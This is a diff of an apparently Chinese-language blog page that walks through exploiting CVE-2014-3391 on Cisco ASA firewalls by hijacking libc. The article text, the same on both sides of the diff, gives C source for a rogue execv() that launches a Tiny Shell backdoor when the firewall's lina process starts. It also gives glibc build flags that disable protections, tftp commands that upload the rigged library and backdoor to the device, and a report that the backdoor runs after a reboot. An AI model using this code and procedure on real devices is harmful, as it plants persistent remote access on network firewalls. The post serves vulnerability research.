@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8" />
 
-<meta name="generator" content="Hexo 4.0.0" />
+<meta name="generator" content="Hexo 4.2.0" />
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
@@ -11,17 +11,24 @@
 
 
     <meta name="description" content="LD_LIBRARY_PATH环境变量会影响Loader的行为，它将告诉Loader在何处寻找共享库，并且其优先级高于系统默认加载路径。一般来说C程序链接其他.so文件时，查找库文件位置顺序如下： 1、编译时指定的位置2、LD_LIBRARY_PATH 指定的位置3、ldconfig 指定的位置4、&#x2F;lib（Linux动态链接库常放的位置）5、&#x2F;usr&#x2F;lib（Linux动态链接库常放的位置） L">
-<meta name="keywords" content="漏洞,Binary,CVE,Linux,Cisco,网络设备">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CVE-2014-3391——Cisco ASA防火墙libc hijack">
-<meta property="og:url" content="https:&#x2F;&#x2F;jontsang.github.io&#x2F;post&#x2F;e7d26c25.html">
+<meta property="og:url" content="https://jontsang.github.io/post/e7d26c25.html">
 <meta property="og:site_name" content="Jon Tsang&#39;Blog">
 <meta property="og:description" content="LD_LIBRARY_PATH环境变量会影响Loader的行为，它将告诉Loader在何处寻找共享库，并且其优先级高于系统默认加载路径。一般来说C程序链接其他.so文件时，查找库文件位置顺序如下： 1、编译时指定的位置2、LD_LIBRARY_PATH 指定的位置3、ldconfig 指定的位置4、&#x2F;lib（Linux动态链接库常放的位置）5、&#x2F;usr&#x2F;lib（Linux动态链接库常放的位置） L">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;JonTsang&#x2F;Figurebed&#x2F;master&#x2F;img&#x2F;20190830103616.jpg">
-<meta property="og:updated_time" content="2019-09-02T01:59:34.000Z">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190830103616.jpg">
+<meta property="article:published_time" content="2017-10-21T07:14:32.000Z">
+<meta property="article:modified_time" content="2019-09-02T01:59:34.000Z">
+<meta property="article:author" content="Jon Tsang">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="Binary">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="网络设备">
+<meta property="article:tag" content="Cisco">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;JonTsang&#x2F;Figurebed&#x2F;master&#x2F;img&#x2F;20190830103616.jpg">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190830103616.jpg">
 
 
 
@@ -108,7 +115,7 @@
             <div class="navbar-end">
                 
                     
-                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/JonTsang">
+                    <a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/JonTsang">
                         
                         <i class="fab fa-github"></i>
                         
@@ -116,12 +123,12 @@
                     
                 
                 
-                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;" target="_blank" rel="noopener">
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
                     <i class="fas fa-list-ul"></i>
                 </a>
                 
                 
-                <a class="navbar-item search" title="搜索" href="javascript:;" target="_blank" rel="noopener">
+                <a class="navbar-item search" title="搜索" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -187,10 +194,10 @@
 <li>glibc-2.9源码</li>
 <li>Unix后门工具——[Tiny Shell][3]</li>
 </ol>
-<h2 id="Cisco-ASA启动过程分析"><a href="#Cisco-ASA启动过程分析" class="headerlink" title="Cisco ASA启动过程分析"></a>Cisco ASA启动过程分析</h2><p>Cisco ASA防火墙的底层是一个运行在x86/x86_64架构上的linux系统，并在防火墙上运行一个名为“lina”的程序，该程序实现了防火墙的全部业务功能。同时，还存在一个lina_monitor程序，负责主程序lina的启动和监控。<br><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164700.png" alt><br>从上图可以看到，/asa/script目录下的shell脚本rcS控制着lina_monitor的启动方式，在该脚本第一行，又执行了另一个脚本rcS.common，让我们一起来看看rcS.common的内容：</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sleep 7</span><br><span class="line"><span class="hljs-keyword">if</span> [ ! -e /mnt/disk0 ]; <span class="hljs-keyword">then</span> mkdir /mnt/disk0; <span class="hljs-keyword">fi</span></span><br><span class="line"><span class="hljs-keyword">if</span> [ ! -e /mnt/disk1 ]; <span class="hljs-keyword">then</span> mkdir /mnt/disk1; <span class="hljs-keyword">fi</span></span><br><span class="line">mount=0</span><br><span class="line">partition=1</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> /sys/block/*d* ; <span class="hljs-keyword">do</span></span><br><span class="line">	[ -x <span class="hljs-string">"<span class="hljs-variable">$i</span>"</span> ] || <span class="hljs-built_in">continue</span></span><br><span class="line">	device=<span class="hljs-variable">$&#123;i#/sys/block/&#125;</span></span><br><span class="line">	devicepath=/dev/<span class="hljs-variable">$device</span><span class="hljs-variable">$partition</span></span><br><span class="line">	mountpoint=/mnt/disk<span class="hljs-variable">$mount</span></span><br><span class="line">	dosfsck -a -V <span class="hljs-variable">$devicepath</span></span><br><span class="line">	<span class="hljs-built_in">echo</span> <span class="hljs-string">"dosfsck(<span class="hljs-variable">$devicepath</span>) returned $?"</span></span><br><span class="line">	/asa/scripts/mount_flash.sh <span class="hljs-variable">$devicepath</span> <span class="hljs-variable">$mountpoint</span> 2&gt;/fserr ||</span><br><span class="line">	mount <span class="hljs-variable">$devicepath</span> <span class="hljs-variable">$mountpoint</span> 2&gt;&gt;/fserr ||</span><br><span class="line">	cat /fserr &gt;&amp;2</span><br><span class="line">	mount=$((<span class="hljs-variable">$mount</span> + 1))</span><br><span class="line"><span class="hljs-keyword">done</span></span><br><span class="line"></span><br><span class="line">rm -f /fserr</span><br><span class="line">mount -o remount,rw /dev/ram0 /</span><br><span class="line">tunctl &gt; /dev/null</span><br><span class="line">modprobe -q tipc 2&gt; /dev/null</span><br><span class="line">ifconfig tap0 127.0.2.2 up 2&gt; /dev/null</span><br><span class="line">tipc-config -netid=1234 -a=1.1.1 -be eth:tap0 2&gt; /dev/null </span><br><span class="line"> <span class="hljs-comment"># tune the VM system</span></span><br><span class="line"><span class="hljs-built_in">echo</span> 2 &gt; /proc/sys/vm/overcommit_memory</span><br><span class="line"><span class="hljs-built_in">echo</span> 100 &gt; /proc/sys/vm/overcommit_ratio</span><br><span class="line"><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="hljs-built_in">ulimit</span> -s 1024</span><br><span class="line"> <span class="hljs-comment"># set shmmax to 3156M which is MAX_GUEST_RAM</span></span><br><span class="line"><span class="hljs-built_in">echo</span> 3309305856 &gt; /proc/sys/kernel/shmmax</span><br><span class="line"> <span class="hljs-comment"># kernel modules for environment monitoring</span></span><br><span class="line">modprobe -q tscsync tscsync_major=129 2&gt; /dev/null</span><br><span class="line">modprobe -q msrif 2&gt; /dev/null</span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"|/asa/bin/coredump_helper %e %p %s %t"</span> &gt; /proc/sys/kernel/core_pattern</span><br><span class="line"> <span class="hljs-comment">#Config cgroup</span></span><br><span class="line">./asa/scripts/cgroup_config</span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"export LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib"</span> &gt;&gt; /tmp/run_cmd</span><br></pre></td></tr></table></figure>
-<p>而在rcS.common的最后一行，我们可以看到导致了漏洞的语句：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib</span><br></pre></td></tr></table></figure><br>LD_LIBRARY_PATH环境变量用于在程序加载运行查找共享库时，指定除了系统默认路径之外的其他路径，使用它可以通过自定义的库替换部分系统自带的C函数库。</p>
-<p>在让我们回到rcS中，该脚本通过下面这行命令启动lina_monitor：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgexec -g memory:privileged /asa/bin/lina_monitor -l</span><br></pre></td></tr></table></figure><br>lina_monitor再以创建子进程的方式启动lina程序，并对lina进程进行监视和管控。至此，<strong>整个Cisco ASA防火墙启动完成，之后不会再有任何程序启动</strong>。关于Linux启动流程的具体细节，可以参见笔者的另一篇文章(还没有写)。</p>
+<h2 id="Cisco-ASA启动过程分析"><a href="#Cisco-ASA启动过程分析" class="headerlink" title="Cisco ASA启动过程分析"></a>Cisco ASA启动过程分析</h2><p>Cisco ASA防火墙的底层是一个运行在x86/x86_64架构上的linux系统，并在防火墙上运行一个名为“lina”的程序，该程序实现了防火墙的全部业务功能。同时，还存在一个lina_monitor程序，负责主程序lina的启动和监控。<br><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164700.png" alt=""><br>从上图可以看到，/asa/script目录下的shell脚本rcS控制着lina_monitor的启动方式，在该脚本第一行，又执行了另一个脚本rcS.common，让我们一起来看看rcS.common的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sleep 7</span><br><span class="line"><span class="keyword">if</span> [ ! -e /mnt/disk0 ]; <span class="keyword">then</span> mkdir /mnt/disk0; <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -e /mnt/disk1 ]; <span class="keyword">then</span> mkdir /mnt/disk1; <span class="keyword">fi</span></span><br><span class="line">mount=0</span><br><span class="line">partition=1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> /sys/block/*d* ; <span class="keyword">do</span></span><br><span class="line">	[ -x <span class="string">"<span class="variable">$i</span>"</span> ] || <span class="built_in">continue</span></span><br><span class="line">	device=<span class="variable">$&#123;i#/sys/block/&#125;</span></span><br><span class="line">	devicepath=/dev/<span class="variable">$device</span><span class="variable">$partition</span></span><br><span class="line">	mountpoint=/mnt/disk<span class="variable">$mount</span></span><br><span class="line">	dosfsck -a -V <span class="variable">$devicepath</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"dosfsck(<span class="variable">$devicepath</span>) returned $?"</span></span><br><span class="line">	/asa/scripts/mount_flash.sh <span class="variable">$devicepath</span> <span class="variable">$mountpoint</span> 2&gt;/fserr ||</span><br><span class="line">	mount <span class="variable">$devicepath</span> <span class="variable">$mountpoint</span> 2&gt;&gt;/fserr ||</span><br><span class="line">	cat /fserr &gt;&amp;2</span><br><span class="line">	mount=$((<span class="variable">$mount</span> + 1))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">rm -f /fserr</span><br><span class="line">mount -o remount,rw /dev/ram0 /</span><br><span class="line">tunctl &gt; /dev/null</span><br><span class="line">modprobe -q tipc 2&gt; /dev/null</span><br><span class="line">ifconfig tap0 127.0.2.2 up 2&gt; /dev/null</span><br><span class="line">tipc-config -netid=1234 -a=1.1.1 -be eth:tap0 2&gt; /dev/null </span><br><span class="line"> <span class="comment"># tune the VM system</span></span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/vm/overcommit_memory</span><br><span class="line"><span class="built_in">echo</span> 100 &gt; /proc/sys/vm/overcommit_ratio</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">ulimit</span> -s 1024</span><br><span class="line"> <span class="comment"># set shmmax to 3156M which is MAX_GUEST_RAM</span></span><br><span class="line"><span class="built_in">echo</span> 3309305856 &gt; /proc/sys/kernel/shmmax</span><br><span class="line"> <span class="comment"># kernel modules for environment monitoring</span></span><br><span class="line">modprobe -q tscsync tscsync_major=129 2&gt; /dev/null</span><br><span class="line">modprobe -q msrif 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"|/asa/bin/coredump_helper %e %p %s %t"</span> &gt; /proc/sys/kernel/core_pattern</span><br><span class="line"> <span class="comment">#Config cgroup</span></span><br><span class="line">./asa/scripts/cgroup_config</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"export LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib"</span> &gt;&gt; /tmp/run_cmd</span><br></pre></td></tr></table></figure>
+<p>而在rcS.common的最后一行，我们可以看到导致了漏洞的语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib</span><br></pre></td></tr></table></figure><br>LD_LIBRARY_PATH环境变量用于在程序加载运行查找共享库时，指定除了系统默认路径之外的其他路径，使用它可以通过自定义的库替换部分系统自带的C函数库。</p>
+<p>在让我们回到rcS中，该脚本通过下面这行命令启动lina_monitor：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgexec -g memory:privileged /asa/bin/lina_monitor -l</span><br></pre></td></tr></table></figure><br>lina_monitor再以创建子进程的方式启动lina程序，并对lina进程进行监视和管控。至此，<strong>整个Cisco ASA防火墙启动完成，之后不会再有任何程序启动</strong>。关于Linux启动流程的具体细节，可以参见笔者的另一篇文章(还没有写)。</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>让我们再回顾一下前面流程中的关键点：</p>
 <ol>
 <li><code>LD_LIBRARY_PATH</code>可以增加一个共享库搜索路径列表。并且先于系统默认加载路径。</li>
@@ -207,9 +214,9 @@
 <li><p>再回到启动流程图中，rcS执行完rcS.common后又执行了四个命令：echo、ulimit、cgexec和reboot，那么对<code>execv()</code>函数的修改是否会影响这四个命令呢?通过查看这四个程序（其中有三个程序是由busybox实现）的符号表，发现它们都未调用<code>execv()</code>函数，还是略有点运气的成分。总而言之，这样我们已经将对防火墙的影响降到最低。</p>
 </li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164814.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164905.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164908.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164814.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164905.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164908.png" alt=""></p>
 <h2 id="编写劫持函数"><a href="#编写劫持函数" class="headerlink" title="编写劫持函数"></a>编写劫持函数</h2><p>在Linux中，产生一个新进程的过程被分成了两个部分（相当于Windows中的CreateProcess）：</p>
 <ol>
 <li>使用fork()函数创建一个新的子进程，此时子进程和父进程完全相同</li>
@@ -218,34 +225,34 @@
 <p>Linux内核使exec函数（共有7个变体：execl、execlp、execle、execv、execvp、execve和fexecve）将程序从磁盘读入内存，并执行程序。在很多类Unix系统的实现中，这7个函数中只有execve是内核的系统调用，另外6个只是库函数，它们最终都要调用该系统调用。有关这部分的更详细内容可以参考APUE的<strong><em>进程控制</em></strong>一章。</p>
 <p>所以我们可以考虑在的<code>execv()</code>中调用一个除<code>execv</code>之外的exec函数来避免产生递归调用。</p>
 <p>通过IDA Pro反编译可以看到lina_monitor启动lina的过程</p>
-<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164937.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164937.png" alt=""></p>
 <p>代码如下：</p>
-<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;                              </span></span></span><br><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *hijack_path = <span class="hljs-string">"/mnt/disk0/tshd"</span>; <span class="hljs-comment">//定义全局变量以便编译后修改路径</span></span><br><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *lina_path = <span class="hljs-string">"/asa/bin/lina"</span>;</span><br><span class="line"><span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> hijack_argv[] = &#123;<span class="hljs-string">"tshd"</span>,<span class="hljs-string">"NULL"</span>&#125;;</span><br><span class="line"><span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> reset_envp[] = &#123;<span class="hljs-string">"LD_LIBRARY_PATH="</span>,<span class="hljs-literal">NULL</span>&#125;;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execv</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[])</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path,lina_path) == <span class="hljs-number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="hljs-keyword">pid_t</span> pid;</span><br><span class="line">		pid=fork();</span><br><span class="line">		<span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)</span><br><span class="line">			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"****fork error****"</span>);</span><br><span class="line">		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid==<span class="hljs-number">0</span>) <span class="hljs-comment">//子进程</span></span><br><span class="line">		&#123;</span><br><span class="line">		__execve (hijack_path, hijack_argv, reset_envp); </span><br><span class="line">    <span class="hljs-comment">/* 在子进程中调用execve运行后门程序</span></span><br><span class="line"><span class="hljs-comment">			 reset_envp用于重置当前进程的环境变量，</span></span><br><span class="line"><span class="hljs-comment">			 以免后续操作继续链接劫持用的libc共享库</span></span><br><span class="line"><span class="hljs-comment">		*/</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="hljs-keyword">return</span> __execve (path, argv, reset_envp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="hljs-keyword">else</span>             <span class="hljs-comment">//父进程</span></span><br><span class="line">	<span class="hljs-keyword">return</span> __execve (path, argv, __environ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;                              </span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *hijack_path = <span class="string">"/mnt/disk0/tshd"</span>; <span class="comment">//定义全局变量以便编译后修改路径</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *lina_path = <span class="string">"/asa/bin/lina"</span>;</span><br><span class="line"><span class="keyword">char</span> *<span class="keyword">const</span> hijack_argv[] = &#123;<span class="string">"tshd"</span>,<span class="string">"NULL"</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *<span class="keyword">const</span> reset_envp[] = &#123;<span class="string">"LD_LIBRARY_PATH="</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execv</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *<span class="keyword">const</span> argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(path,lina_path) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">pid_t</span> pid;</span><br><span class="line">		pid=fork();</span><br><span class="line">		<span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"****fork error****"</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (pid==<span class="number">0</span>) <span class="comment">//子进程</span></span><br><span class="line">		&#123;</span><br><span class="line">		__execve (hijack_path, hijack_argv, reset_envp); </span><br><span class="line">    <span class="comment">/* 在子进程中调用execve运行后门程序</span></span><br><span class="line"><span class="comment">			 reset_envp用于重置当前进程的环境变量，</span></span><br><span class="line"><span class="comment">			 以免后续操作继续链接劫持用的libc共享库</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> __execve (path, argv, reset_envp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>             <span class="comment">//父进程</span></span><br><span class="line">	<span class="keyword">return</span> __execve (path, argv, __environ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>流程如下：</p>
-<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831165001.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831165001.png" alt=""></p>
 <p><strong>编译glibc-2.9</strong></p>
 <ol>
 <li>之所以要编译整个libc库而不单独劫持execv是因为所有的程序都要链接libc库，</li>
 <li>编译参数</li>
 </ol>
-<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export CFLAGS="-O2 -U_FORTIFY_SOURCE -march=i686 -mtune=native -fno-stack-protector"</span><br><span class="line">../glibc-2.9/configure --prefix=/root/usr/ --disable-profile --enable-kernel=2.6.26</span><br></pre></td></tr></table></figure>
-<h2 id="上传文件测试"><a href="#上传文件测试" class="headerlink" title="上传文件测试"></a>上传文件测试</h2><p>将我们编译好的so文件和后门上传:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy tftp://10.1.1.21/libc-2.9-14.so disk0:/lib/libc.so.6</span><br><span class="line">copy tftp://10.1.1.21/tshd disk0:/tshd</span><br></pre></td></tr></table></figure><br>重启路由器，在Cisco CLI下执行show kernel process命令，可以看到后门已经在运行了</p>
-<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831165050.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831165104.png" alt></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa" target="_blank" rel="noopener">Multiple Vulnerabilities in Cisco ASA Software</a><br><a href="https://gms.tf/ld_library_path-considered-harmful.html" target="_blank" rel="noopener">LD_LIBRARY_PATH considered harmful</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export CFLAGS="-O2 -U_FORTIFY_SOURCE -march=i686 -mtune=native -fno-stack-protector"</span><br><span class="line">../glibc-2.9/configure --prefix=/root/usr/ --disable-profile --enable-kernel=2.6.26</span><br></pre></td></tr></table></figure>
+<h2 id="上传文件测试"><a href="#上传文件测试" class="headerlink" title="上传文件测试"></a>上传文件测试</h2><p>将我们编译好的so文件和后门上传:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy tftp:&#x2F;&#x2F;10.1.1.21&#x2F;libc-2.9-14.so disk0:&#x2F;lib&#x2F;libc.so.6</span><br><span class="line">copy tftp:&#x2F;&#x2F;10.1.1.21&#x2F;tshd disk0:&#x2F;tshd</span><br></pre></td></tr></table></figure><br>重启路由器，在Cisco CLI下执行show kernel process命令，可以看到后门已经在运行了</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831165050.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831165104.png" alt=""></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa">Multiple Vulnerabilities in Cisco ASA Software</a><br><a href="https://gms.tf/ld_library_path-considered-harmful.html">LD_LIBRARY_PATH considered harmful</a></p>
 
         </div>
-        <!-- 文章结尾添加版权声明 从这里开始 -->
-        
-            <ul class="post-copyright">
-                <li><strong>本文标题：</strong><a href="https://jontsang.github.io/post/e7d26c25.html">CVE-2014-3391——Cisco ASA防火墙libc hijack</a></li>
-                <li><strong>本文作者：</strong><a href="https://jontsang.github.io">Jon Tsang</a></li>
-                <!-- <li><strong>本文链接：</strong><a href="https://jontsang.github.io/post/e7d26c25.html">https://jontsang.github.io/post/e7d26c25.html</a></li> -->
-                <li><strong>发布时间：</strong>2017-10-21</li>
-                <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
-                </ul>
-        
-        <!-- 文章结尾添加版权声明 到这里结束 -->
+                <!-- 文章结尾添加版权声明 从这里开始 -->
+                
+                    <ul class="post-copyright">
+                        <li><strong>本文标题：</strong><a href="https://jontsang.github.io/post/e7d26c25.html">CVE-2014-3391——Cisco ASA防火墙libc hijack</a></li>
+                        <li><strong>本文作者：</strong><a href="https://jontsang.github.io">Jon Tsang</a></li>
+                        <!-- <li><strong>本文链接：</strong><a href="https://jontsang.github.io/post/e7d26c25.html">https://jontsang.github.io/post/e7d26c25.html</a></li> -->
+                        <li><strong>发布时间：</strong>2017-10-21</li>
+                        <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
